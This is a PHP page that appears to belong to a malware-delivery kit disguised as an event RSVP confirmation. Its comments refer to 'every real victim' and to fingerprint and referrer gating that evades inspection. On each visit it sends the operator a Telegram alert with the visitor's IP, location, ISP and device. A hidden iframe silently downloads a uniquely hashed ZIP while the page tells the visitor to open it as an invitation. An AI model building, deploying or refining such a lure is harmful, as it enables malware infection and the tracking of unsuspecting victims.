<?php
require __DIR__ . '/../lib.php';

// Step 3: must arrive from download.php, full Chrome fingerprint.
// The load is scripted (2.6s "sending" spinner), so Chrome sends
// Sec-Fetch-User: ?0 even for a human click — requireUser must stay
// false here or every real victim 404s. Pacing is enforced by minAge.
gate_doc(['/download.php'], 4, false);

$name = (string)($_GET['n'] ?? '');
if ($name === '' || preg_match('/[^A-Za-z0-9_. -]/', $name)) { $name = make_name(); }
$name = substr($name, 0, 90);
if (!str_ends_with($name, '.zip')) { $name .= '.zip'; }
$tok  = check_token($_GET['tk'] ?? null);
$kind = name_kind($name);

$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);

// ---- one Telegram alert per visit (deduped by token nonce) ----
$key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
if (!@file_exists($key)) {
    @touch($key);
    $g   = geo(ip());
    $msg = "\x{1F942} New RSVP Triggered \x{1F942}\n"
         . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
         . "\x{1F4CD} IP: " . ip() . "\n"
         . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
         . "\x{1F310} ISP: " . $g['isp'] . "\n"
         . "\x{1F4C1} File: " . $name . "\n"
         . "\x{1F4F1} Device: " . ua();
    tg($msg);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="robots" content="noindex, nofollow">
  <title>You&rsquo;re on the list</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400;1,500&family=Jost:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body { height:100%; background:#131315; color:#efe9df;
      font-family:'Jost',sans-serif; -webkit-font-smoothing:antialiased; }
    body { display:flex; align-items:center; justify-content:center;
      text-align:center; padding:40px 20px; }
    .card { position:relative; max-width:540px; width:100%;
      padding:70px 48px 60px 48px; }
    .card:before { content:''; position:absolute; inset:14px;
      border:1px solid rgba(239,233,223,.18); pointer-events:none; }
    .card:after { content:''; position:absolute; inset:18px;
      border:1px solid rgba(239,233,223,.08); pointer-events:none; }
    .check { width:64px; height:64px; margin:0 auto 30px auto; }
    .eyebrow { font-size:11px; letter-spacing:6px; text-transform:uppercase;
      color:rgba(239,233,223,.55); margin-bottom:22px; }
    .title { font-family:'Cormorant Garamond',Georgia,serif; font-size:46px;
      font-weight:500; line-height:1.12; color:#f4efe6; margin-bottom:24px; }
    .msg { font-family:'Cormorant Garamond',Georgia,serif; font-size:23px;
      line-height:1.55; color:rgba(239,233,223,.9); margin:0 auto 26px auto;
      max-width:430px; }
    .file { font-size:11px; letter-spacing:2px; text-transform:uppercase;
      color:rgba(239,233,223,.5); line-height:2.1; }
    .file b { color:rgba(239,233,223,.75); font-weight:500; }
    .foot { margin-top:40px; font-size:10.5px; letter-spacing:3px;
      text-transform:uppercase; color:rgba(239,233,223,.35); }
  </style>
</head>
<body>
  <div class="card">
    <svg class="check" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="32" cy="32" r="29" stroke="#c9a86a" stroke-width="1.5"/>
      <path d="M20 33 L28.5 41.5 L44 24" stroke="#c9a86a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
    <div class="eyebrow">RSVP Confirmed</div>
    <div class="title">You&rsquo;re on the list!</div>
    <div class="msg">Your response has been received. We&rsquo;ve saved your
      spot &mdash; look for the event details shortly.</div>
    <div class="file">
      Your invitation has been saved to your device.<br>
      Open <b><?php echo htmlspecialchars($name); ?></b> to view your event details.
    </div>
    <div class="foot">We can&rsquo;t wait to see you there.</div>
  </div>

  <!-- Hidden iframe to trigger the actual (fresh-name, unique-hash) download.
       Sec-Fetch-Dest: iframe, no Sec-Fetch-User — exactly what gate_dl() expects. -->
  <iframe src="dl.php?tk=<?php echo $tk; ?>&n=<?php echo $nameQ; ?>" style="display:none;" onload="this.remove();"></iframe>
</body>
</html>
